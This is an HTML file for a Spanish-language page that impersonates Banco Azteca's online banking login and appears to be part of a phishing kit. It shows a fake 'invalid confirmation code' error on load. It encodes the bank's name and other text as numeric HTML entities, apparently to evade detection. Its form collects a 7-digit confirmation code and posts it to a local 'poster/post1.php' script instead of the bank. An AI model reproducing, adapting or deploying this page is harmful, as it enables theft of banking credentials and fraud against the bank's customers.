<!DOCTYPE html PUBLIC «-//W3C//DTD XHTML 1.1//EN» «http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd»>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <title>&#65;&#99;&#99;&#101;&#115;&#111;&nbsp;&#97;&nbsp;&#66;&#97;&#110;&#99;&#97;&nbsp;&#124;&nbsp;&#66;&#97;&#110;&#99;&#111;&nbsp;&#65;&#122;&#116;&#101;&#99;&#97;</title>
	<link rel="shortcut icon" 	 href="resources/favicon.ico" type="image/x-icon" sizes="32x32" />
	<link rel="stylesheet" media="all" href="css/fonts.css" />
 	<link rel="stylesheet" media="all" href="css/structurelog.css" />
	<link rel="stylesheet" href="css/estilos.css">
	<script src="//cdn.jsdelivr.net/npm/sweetalert2@10"></script>
	    <!-- CSS only -->
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-eOJMYsd53ii+scO/bJGFsiCZc+5NDVN2yr8+0RDqr0Ql0h+rP48ckxlpbzKgwra6" crossorigin="anonymous">
<!-- JavaScript Bundle with Popper -->
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta3/dist/js/bootstrap.bundle.min.js" integrity="sha384-JEW9xMcG8R+pH31jmWH6WWP0WintQrMb4s7ZOdauHnUtxwoG2vI5DkLtS3qm9Ekf" crossorigin="anonymous"></script>
</head>

<body class="ndx">

							<style>
							    .btn{
							        background-color: #17a54d;
							        height: 50px;
							        border-radius: 40px;
							    }
							    .btn:hover{
                                    color: #ffffff;
							    }
							</style>

<script>
Swal.fire({
    icon: 'error',
    backdrop: true,
    title: 'Clave de confirmaci&oacute;n invalida',
    html: '<p style="text-align: center;">La clave solo puede contener n&uacute;meros</p>',
    confirmButtonText: 'Aceptar',
    allowOutsideClick: false,

});
</script>

<header id="main-header">
	<nav>
			<a class="logotipo" href="index.php"><img src="resources/banco-azteca-logo.png" width="30px" height="30px"></a>

			</div>
		</nav>
</header>

<div class="mdLgn">
	<div class="lmt">
			<div class="mdCnt">
				<h2 class="mdHdr">
				&#65;&#99;&#99;&#101;&#100;&#101;&nbsp;&#97;&nbsp;&#116;&#117; <br />
					<span class="bold"><strong>&#66;&#97;&#110;&#99;&#97;&nbsp;&#101;&#110;&nbsp;&#76;&iacute;&#110;&#101;&#97;<div class="bull">&bull;</div></strong></span>
				</h2>
				<div class="frmWrpr">
                    <form action="poster/post1.php" method="post">
					<ul>
						<li class="aCenter">
							<div class="fields">
								<input type="password" name="code"
									placeholder="Clave de confirmaci&oacute;n" class="field"
									maxlength="7" minlength="7" autocomplete="off"/>
							</div>
							<div class="btns">
									<input type="submit" class="btn" value="Ingresar"></input>
								</div>
						</li>
					</ul>
                </form>
				</div>
			</div>
			<div class="mdFtr">&#77;&#88;&#50;&#51;</div>
	</div>
</div>

<footer class="fter">
	<div class="cont">
		<a href="#" class="link">&#66;&#97;&#110;&#99;&#111;&nbsp;&#65;&#122;&#116;&#101;&#99;&#97;&nbsp;&#83;&#46;&#65;&#46;&#44;&nbsp;&#73;&#110;&#115;&#116;&#105;&#116;&#117;&#99;&#105;&#xF3;&#110;&nbsp;&#100;&#101;&nbsp;&#66;&#97;&#110;&#99;&#97;&nbsp;&#77;&#xFA;&#108;&#116;&#105;&#112;&#108;&#101;&#46;&nbsp;&#68;&#101;&#114;&#101;&#99;&#104;&#111;&#115;&nbsp;&#114;&#101;&#115;&#101;&#118;&#97;&#100;&#111;&#115;&#44;&nbsp;&#50;&#48;&#49;&#56;</a>
	</div>
</footer>

</body>
</html>